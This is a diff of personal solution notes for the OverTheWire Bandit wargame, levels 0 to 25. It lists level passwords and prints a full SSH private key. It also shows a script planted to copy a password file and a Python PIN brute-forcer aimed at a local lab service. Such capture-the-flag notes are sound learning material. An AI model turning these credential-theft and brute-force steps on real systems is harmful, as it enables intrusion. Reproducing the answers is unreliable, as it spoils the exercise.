@@ -22,23 +22,51 @@ ubuntu:123456
 
 
 single jar
-bandit2@bandit:~$ cat ./-
-bandit3@bandit:~$ ls -artl inhere/
+ssh bandit0@bandit.labs.overthewire.org -p 2220  (bandit0)
+bandit1/boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+bandit2/CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+bandit2@bandit:~$ cat "spaces in this filename"
+
+bandit3/UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+bandit3@bandit:~$ find inhere -type f -name ".*" |xargs ls -artl
+-rw-r----- 1 bandit4 bandit3 33 May  7  2020 inhere/.hidden
+bandit3@bandit:~$ cat inhere/.hidden
+
+bandit4@pIwrPrtPN36QITSp3EQaw936yaFoFgAB
 bandit4@bandit:~/inhere$ file ./-*
+bandit4@bandit:~/inhere$ cat ./-file07
+
+bandit5/koReBOKuIDDepwhWk7jZC0RTdopnAYKh
 bandit5@bandit:~/inhere$ find . -size  1033c
 bandit5@bandit:~/inhere$ file ./maybehere07/.file2
 bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
 bandit5@bandit:~/inhere$ find . -type f | xargs ls -artl | grep 1033
+
+bandit6/DXjZPULLxYr17uwoI01bNLQbtFemEgo7
 bandit6@bandit:~$ find / -type f -size 33c| xargs ls -artl| grep bandit7| grep bandit6
 bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c| xargs ls -artl
+
+bandit7//var/lib/dpkg/info/bandit7.password
 bandit7@bandit:~$ grep millionth data.txt
+
+bandit8@cvX2JJa4CFALtqS87jk27qwqGhBM9plV
 bandit8@bandit:~$ sort data.txt |uniq -u
+
+bandit9/UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
 bandit9@bandit:~$ strings data.txt | grep "========"
-bandit10@bandit:~$ cat data.txt
+
+bandit10/truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
 bandit10@bandit:~$ man base64
 bandit10@bandit:~$ base64 -d data.txt
+
+bandit11/IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
 bandit11@bandit:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-M
-bandit12 :
+cat data.txt | tr a-zA-Z n-za-mN-ZA-M
+echo $PATH|tr ":" "\n"
+
+bandit12/5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
 bandit12@bandit:/tmp/vika123$ history
     1  ls -artl
     2  cd /tmp
@@ -96,6 +124,8 @@ bandit12@bandit:/tmp/vika123$ history
    54  history
 bandit12@bandit:/tmp/vika123$
 
+bandit13/8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
 bandit13@bandit:~$ ls -artl
 total 24
 -rw-r--r--  1 root     root      675 May 15  2017 .profile
@@ -105,6 +135,35 @@ total 24
 drwxr-xr-x  2 root     root     4096 May  7  2020 .
 drwxr-xr-x 41 root     root     4096 May  7  2020 ..
 bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
+bandit13@bandit:~$ cat sshkey.private
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
+gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
+ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
+ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
+ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
+jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
+J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
+pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
+xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
+nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
+o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
+ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
+laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
+M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
+1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
+PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
+8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
+xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
+GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
+3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
+iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
+9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
+qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
+kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
+/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
+-----END RSA PRIVATE KEY-----
+
 
 bandit14@bandit:~$  cat /etc/bandit_pass/bandit14
 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
@@ -112,10 +171,9 @@ bandit14@bandit:~$ nc localhost 30000
 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
 Correct!
 BfMYroe26WYalil77FoDi9qh59eK5xNr
-BfMYroe26WYalil77FoDi9qh59eK5xNr
 bandit14@bandit:~$ ssh bandit15@localhost
 
-
+bandit15/BfMYroe26WYalil77FoDi9qh59eK5xNr
 bandit15@bandit:~$ openssl s_client -connect localhost:30001
 CONNECTED(00000003)
 depth=0 CN = localhost
@@ -188,11 +246,10 @@ SSL-Session:
 BfMYroe26WYalil77FoDi9qh59eK5xNr
 Correct!
 cluFn7wTiGryunymYOu4RcffSxQluehd
-
 closed
 bandit15@bandit:~$
 
-bandit16@bandit:~$ nmap -sV -p31000-32000 localhost
+bandit16/cluFn7wTiGryunymYOu4RcffSxQluehd
 bandit16@bandit:~$ nmap -sV -p31000-32000 localhost
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2019-01-01 12:31 CET          VIka: press CTRL+C
@@ -204,7 +261,10 @@ PORT      STATE SERVICE     VERSION
 31790/tcp open  ssl/unknown
 
 ...
+
 bandit16@bandit:~$ openssl s_client -connect localhost:31790
+openssl s_client -connect localhost:31790
+openssl s_client -connect localhost:31790
 CONNECTED(00000003)
 depth=0 CN = localhost
 [...]
@@ -261,5 +321,173 @@ bandit16@bandit:/tmp/vika_tmp$ history
    18  ssh -i bandit17.key bandit17@localhost
    19  chmod 400 bandit17.key
    20  ssh -i bandit17.key bandit17@localhost
-   21  history
+   
+bandit17@bandit:~$ diff passwords.old  passwords.new
+42c42
+< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
+---
+> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+bandit17@bandit:~$
 
+bandit18/kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+bandit17@bandit:/tmp/vika_tmp$ ssh -t bandit18@localhost bash --norc --noprofile
+ssh bandit18@bandit.labs.overthewire.org -p2220 cat "readme" > password
+bash-4.4$ cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit19/IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+bandit20/GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+1st terminal
+bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j| nc -vlp 12345
+listening on [any] 12345 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 50252
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+bandit20@bandit:~$
+2nd terminal, in parallel:
+bandit20@bandit:~$ ./suconnect 12345
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+bandit20@bandit:~$
+
+bandit21/gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+bandit21@bandit:~$ ls  /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+
+bandit21@bandit:~$ cat //etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+bandit21@bandit:~$
+
+bandit22/Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+bandit22@bandit:~$  ls -artl /etc/cron.d/
+total 36
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22
+-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23
+-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24
+drwxr-xr-x 87 root root 4096 May 14  2020 ..
+-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root
+-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root
+-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root
+drwxr-xr-x  2 root root 4096 Jul 11  2020 .
+
+bandit22@bandit:~$ cat  /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:~$ echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit23/jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$
+bandit23@bandit:/tmp/vik1234$ history
+    2  cat /etc/cron.d/cronjob_bandit24
+    3  cat /usr/bin/cronjob_bandit24.sh
+   10  mkdir /tmp/vik1234
+   11  chmod 777 /tmp/vik1234
+   12  cd  /tmp/vik1234
+   13  ls
+   14  vi script1.sh       - did not work (Vika)
+
+   46  cd /var/spool/bandit24/
+   50  vi script1.sh
+bandit23@bandit:/tmp/vik1234$ cat script1.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/vik1234/password
+
+bandit23@bandit:/tmp/vik1234$ ls
+password  script1.sh
+bandit23@bandit:/tmp/vik1234$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+bandit24/UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+PY script:
+
+#!/usr/bin/env python3
+# coding: utf-8
+import sys
+import socket
+pincode = 0
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+try:
+    # Connect to server
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1", 30002))
+    
+    # Print welcome message
+    welcome_msg = s.recv(2048)
+    print(welcome_msg)
+    # Try brute-forcing
+    while pincode < 10000:
+        pincode_string = str(pincode).zfill(4)
+        message=password+" "+pincode_string+"\n"
+        # Send message
+        s.sendall(message.encode())
+        receive_msg = s.recv(1024)
+        # Check result
+        if "Wrong" in receive_msg:
+            print("Wrong PINCODE: %s" % pincode_string)
+        else:
+            print(receive_msg)
+            break
+        pincode += 1
+finally:
+    sys.exit(1)
+
+bandit24@bandit:/tmp/vk2425$ python ./pi-script.py
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+Wrong PINCODE: 0000
+Wrong PINCODE: 0001
+Wrong PINCODE: 0002
+....
+Wrong PINCODE: 2586
+Wrong PINCODE: 2587
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+bandit24@bandit:/tmp/vk2425
+bandit25/uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
